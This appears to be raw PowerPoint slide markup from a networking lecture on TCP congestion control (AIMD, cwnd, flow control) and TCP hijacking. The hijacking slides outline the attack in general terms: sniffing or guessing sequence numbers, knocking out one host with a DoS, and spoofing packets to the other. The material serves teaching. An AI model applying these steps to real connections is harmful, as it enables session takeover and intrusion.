              <a:off x="5684760" y="4711680"/>
              <a:ext cx="756720" cy="225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4" name="CustomShape 49"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5445360" y="4656240"/>
              <a:ext cx="2575440" cy="303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Seq=100, 20 bytes of data</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="815" name="Group 50"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5124600" y="1338120"/>
              <a:ext cx="630000" cy="533160"/>
              <a:chOff x="5124600" y="1338120"/>
              <a:chExt cx="630000" cy="533160"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="816" name="Picture 94" descr="desktop_computer_stylized_medium"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId3"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="5124600" y="1338120"/>
                <a:ext cx="630000" cy="53316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17" name="CustomShape 51"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="5393160" y="1389600"/>
                <a:ext cx="306000" cy="24372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818" name="Group 52"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="7702560" y="1365120"/>
              <a:ext cx="653760" cy="579240"/>
              <a:chOff x="7702560" y="1365120"/>
              <a:chExt cx="653760" cy="579240"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="819" name="Picture 97" descr="desktop_computer_stylized_medium"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId3"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="7702560" y="1365120"/>
                <a:ext cx="653760" cy="57924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820" name="CustomShape 53"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7759800" y="1420920"/>
                <a:ext cx="317520" cy="26496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TextShape 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="57636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Principles of congestion control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Shape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="441360" y="1719360"/>
            <a:ext cx="501300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i="1" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>congestion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>:</a:t>
            </a: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informally: “too many sources sending too much data too fast for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="1" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>network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to handle”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different from flow control!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manifestations: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lost packets (buffer overflow at routers)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628560" lvl="1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long delays (queueing in router buffers)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 top-10 problem!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976A41E1-510B-4C5E-A044-3B48E2CE8895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23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24" name="Picture 4" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1374840"/>
            <a:ext cx="5122440" cy="172800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="825" name="Group 4"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5305320" y="4522680"/>
            <a:ext cx="5226120" cy="1590840"/>
            <a:chOff x="5305320" y="4522680"/>
            <a:chExt cx="5226120" cy="1590840"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="826" name="Line 5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="10531440" y="5178600"/>
              <a:ext cx="0" cy="234360"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="28440">
              <a:solidFill>
                <a:schemeClr val="bg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7" name="CustomShape 6"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5305320" y="4753440"/>
              <a:ext cx="3528360" cy="1142280"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FFFFFF"/>
            </a:solidFill>
            <a:ln w="28440">
              <a:solidFill>
                <a:srgbClr val="CC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8" name="CustomShape 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5394600" y="4926600"/>
              <a:ext cx="3479040" cy="11869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800" b="0" strike="noStrike" spc="-1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Gill Sans MT"/>
                  <a:ea typeface="ＭＳ Ｐゴシック"/>
                </a:rPr>
                <a:t>sender won’t overflow receiver’s buffer by transmitting too much, too fast</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1800" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="829" name="Group 8"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5535360" y="4522680"/>
              <a:ext cx="2271960" cy="516960"/>
              <a:chOff x="5535360" y="4522680"/>
              <a:chExt cx="2271960" cy="516960"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="830" name="CustomShape 9"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5749920" y="4627440"/>
                <a:ext cx="1870920" cy="39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31" name="CustomShape 10"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5535360" y="4522680"/>
                <a:ext cx="2271960" cy="5169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800" b="0" i="1" strike="noStrike" spc="-1">
                    <a:solidFill>
                      <a:srgbClr val="CC0000"/>
                    </a:solidFill>
                    <a:latin typeface="Gill Sans MT"/>
                    <a:ea typeface="ＭＳ Ｐゴシック"/>
                  </a:rPr>
                  <a:t>flow control</a:t>
                </a:r>
                <a:endParaRPr lang="nl-NL" sz="2800" b="0" strike="noStrike" spc="-1">
                  <a:latin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TextShape 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3494160" y="334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TCP congestion control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Shape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="441360" y="1158840"/>
            <a:ext cx="8440200" cy="2226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91960" indent="-291600">
              <a:lnSpc>
                <a:spcPct val="85000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="CC0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="1" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>approach:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="1" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="ＭＳ Ｐゴシック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sender</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="1" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>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increases transmission rate (window size), probing for usable bandwidth, until loss occurs</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL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240">
              <a:lnSpc>
                <a:spcPct val="85000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="CC0000"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="1" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>additive increase: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increase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cwnd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by 1 MSS every RTT until loss detected</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL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240">
              <a:lnSpc>
                <a:spcPct val="85000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="CC0000"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="1" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>multiplicative decrease</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>: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 cut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cwnd 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in half after loss </a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="2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nl-NL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A0EC62F-AAE5-4577-858F-299FF8132D76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24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35" name="Picture 4" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3494160" y="853920"/>
            <a:ext cx="4001760" cy="172800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="836" name="Group 4"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="424440" y="3622680"/>
            <a:ext cx="8456040" cy="2851560"/>
            <a:chOff x="424440" y="3622680"/>
            <a:chExt cx="8456040" cy="2851560"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="837" name="CustomShape 5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3664080" y="3659040"/>
              <a:ext cx="685440" cy="304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8" name="CustomShape 6"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="16200000">
              <a:off x="2070000" y="4785120"/>
              <a:ext cx="2055960" cy="516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400" b="1" strike="noStrike" spc="-1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Courier New"/>
                  <a:ea typeface="ＭＳ Ｐゴシック"/>
                </a:rPr>
                <a:t>cwnd:</a:t>
              </a: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 TCP sender </a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr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congestion window size</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="839" name="CustomShape 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="424440" y="4448160"/>
              <a:ext cx="2148480" cy="10051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AIMD saw tooth</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="2000" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="r">
                <a:lnSpc>
                  <a:spcPct val="100000"/>
                </a:lnSpc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behavior: probing</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="2000" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="r">
                <a:lnSpc>
                  <a:spcPct val="100000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="20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for bandwidth</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="2000" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="840" name="Line 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3504960" y="6149880"/>
              <a:ext cx="4143600" cy="0"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="2844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1" name="Line 9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3493800" y="3735360"/>
              <a:ext cx="0" cy="2415960"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="2844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2" name="Line 10"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="3504960" y="4852800"/>
              <a:ext cx="169920" cy="169920"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="381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3" name="Line 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3686040" y="4841640"/>
              <a:ext cx="0" cy="642960"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="381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4" name="Line 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="3674880" y="4525920"/>
              <a:ext cx="982800" cy="981000"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="381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5" name="Line 13"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4646520" y="4527360"/>
              <a:ext cx="0" cy="801720"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="381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846" name="Group 14"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="4638600" y="4402080"/>
              <a:ext cx="3039840" cy="1106280"/>
              <a:chOff x="4638600" y="4402080"/>
              <a:chExt cx="3039840" cy="1106280"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="847" name="Line 15"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipV="1">
                <a:off x="4638600" y="4824360"/>
                <a:ext cx="525240" cy="523800"/>
              </a:xfrm>
              <a:prstGeom prst="line">
                <a:avLst/>
              </a:prstGeom>
              <a:ln w="381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848" name="Group 16"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="5163840" y="4402080"/>
                <a:ext cx="2514600" cy="1106280"/>
                <a:chOff x="5163840" y="4402080"/>
                <a:chExt cx="2514600" cy="1106280"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="849" name="Line 17"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5163840" y="4819320"/>
                  <a:ext cx="0" cy="68904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50" name="Line 18"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm flipV="1">
                  <a:off x="5175000" y="4505040"/>
                  <a:ext cx="970200" cy="98136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51" name="Line 19"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="6140160" y="4505040"/>
                  <a:ext cx="11160" cy="83520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52" name="Line 20"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm flipV="1">
                  <a:off x="6145200" y="4668480"/>
                  <a:ext cx="666720" cy="66708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53" name="Line 21"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="6811920" y="4654440"/>
                  <a:ext cx="0" cy="74772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854" name="Line 22"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm flipV="1">
                  <a:off x="6802200" y="4402080"/>
                  <a:ext cx="876240" cy="1014120"/>
                </a:xfrm>
                <a:prstGeom prst="line">
                  <a:avLst/>
                </a:prstGeom>
                <a:ln w="38160">
                  <a:solidFill>
                    <a:schemeClr val="tx1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855" name="CustomShape 23"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4150080" y="3622680"/>
              <a:ext cx="4730400" cy="577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additively increase window size …</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1600" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri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…. until loss occurs (then cut window in half)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856" name="CustomShape 24"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3598920" y="3816360"/>
              <a:ext cx="858600" cy="1015560"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="541" h="640">
                  <a:moveTo>
                    <a:pt x="541" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="640"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/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7" name="CustomShape 25"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3743280" y="4019400"/>
              <a:ext cx="796680" cy="999720"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="502" h="630">
                  <a:moveTo>
                    <a:pt x="502" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="56" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="630"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/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8" name="CustomShape 26"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4051440" y="3814920"/>
              <a:ext cx="406080" cy="1168200"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="256" h="736">
                  <a:moveTo>
                    <a:pt x="256" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="736"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/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9" name="CustomShape 27"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4689360" y="4179960"/>
              <a:ext cx="167760" cy="634680"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="106" h="400">
                  <a:moveTo>
                    <a:pt x="106" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="106" y="400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="400"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="93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0" name="CustomShape 28"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5041080" y="6140520"/>
              <a:ext cx="63828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time</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1600" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="861" name="CustomShape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6912000" y="6477120"/>
            <a:ext cx="196956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8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TCP hijacking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Shape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="430200" y="1527120"/>
            <a:ext cx="822924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 TCP connection between two hosts is defined by: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The source and destination IP address and port numbers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The sequence and acknowledgement numbers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CB761F1-F5BE-4876-BFA0-13EFF388FED8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25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69" name="Picture 6" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="484200" y="1273320"/>
            <a:ext cx="2342880" cy="186840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="870" name="CustomShape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7335720" y="422748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9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871" name="Afbeelding 3"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1563840" y="2573280"/>
            <a:ext cx="5705280" cy="1961640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="872" name="CustomShape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="430200" y="4775040"/>
            <a:ext cx="8229240" cy="177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If we can find this information, we can take over the connection. How?</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="18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Sniffing network traffic (i.e.                     )  </a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="18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Guessing</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="1800" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-285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There’s a reason SYN and ACK numbers don’t start at 1</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="1600" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-285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But many TCP implementations still don’t generate them really randomly</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="1600" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-285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We can guess as often as we like</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="1600" b="0" strike="noStrike" spc="-1"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600" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="873" name="Picture 2"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3598920" y="5040360"/>
            <a:ext cx="1039320" cy="290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Afbeelding 12"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1413000" y="3452760"/>
            <a:ext cx="5705280" cy="1961640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="875" name="Afbeelding 2"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1413000" y="3371760"/>
            <a:ext cx="5714640" cy="3152520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="876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TCP hijacking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Shape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="430200" y="1527120"/>
            <a:ext cx="822924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To attack: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Take out or slow down host A (maybe use a DOS attack), so A can’t reply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Send your own packet to host B, spoofing the IP address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Now you can send data to host B, while host A will never be able to resync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7DE488E5-1FB1-4001-A836-EC48088D0045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26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79" name="Picture 6" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="484200" y="1273320"/>
            <a:ext cx="2342880" cy="186840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="880" name="CustomShape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
